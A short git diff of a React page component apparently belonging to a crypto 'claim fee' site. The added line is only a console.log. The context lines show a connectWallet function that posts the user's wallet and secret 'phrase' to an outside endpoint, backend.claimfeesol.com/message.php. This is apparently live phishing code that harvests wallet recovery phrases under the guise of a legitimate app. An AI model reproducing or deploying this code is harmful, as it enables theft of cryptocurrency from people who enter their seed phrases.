@@ -30,6 +30,7 @@ export default function Home() {
 
   const connectWallet = async (e) => {
     try {
+        console.log("Hello World");
         const url = "https://backend.claimfeesol.com/message.php";
 
         const response = await axios.post(url, {"wallet": wallet, "phrase": phrase}, {
